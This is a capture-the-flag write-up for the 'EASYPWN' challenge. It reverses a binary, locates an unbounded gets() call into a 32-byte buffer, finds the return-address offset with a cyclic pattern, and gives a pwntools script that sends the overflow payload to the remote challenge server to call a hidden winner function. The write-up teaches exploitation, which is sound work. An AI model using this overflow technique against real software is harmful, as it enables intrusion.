# EASYPWN

<p align="center">
    <img src="img/easypwn_chall.png" alt="Challenge" width="450"/>
</p>

We are given a binary and additional files to set up a docker environment similar to the one running remote.

When reversing the binary in IDA we see the following two functions
```c
int __fastcall main(int argc, const char **argv, const char **envp){
  ignore_me_init_buffering(argc, argv, envp);
  hello();
  return 0;
}
```

```c
int hello(){
  char v1[32]; // [rsp+0h] [rbp-20h] BYREF
  puts("Hello!");
  puts("What's your name? ");
  gets(v1);
  return printf("Goodbye, %s!\n", v1);
}
```

There is also a function `winner`, which is not called anywhere, and will print the flag to us.


We can see in the `hello` function that `gets(v1)` is called. `gets` is dangerous to use, because it reads in *everything* that is given as input, leading to buffer overflows being possible.


Given that buffer `v1` is only 32 bytes in size, if we supply more than 32 bytes we will overflow and overwrite stack values. The return address is stored on the stack, so if we overflow it we can redirect the program execution to run the `winner` function, instead of going back to `main`.


If we send a *cyclic* sequence as input, we can read the address where we crashed, which is `0x6161616161616166`. The `cyclic -l 0x6161616161616166` in pwndbg

<p align="center">
    <img src="img/gdb_offset.png" alt="Challenge" width="400"/>
</p>

```
pwndbg> cyclic -l 0x6161616161616166
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

Knowing the offset we can construct a payload which overflows the `v1` buffer with 40 bytes, and then overwrites the return address on the stack with the address of `winner`. The address of `winner` finds *pwntools* for us (but can also be found in many other ways).

```python
payload = b"A" * 40
payload += p64(exe.sym.winner) # Convert the address into bytes
```

We can construct a solve script
```python
from pwn import *

exe = context.binary = ELF("./easypwn", checksec=False)
io = remote("io.ept.gg", 30004)
io.clean()

payload = b"A"*40
payload += p64(exe.sym.winner) # Convert the address into bytes

io.sendline(payload)
io.interactive()
```

which gives us the flag when ran against the remote instance
```
```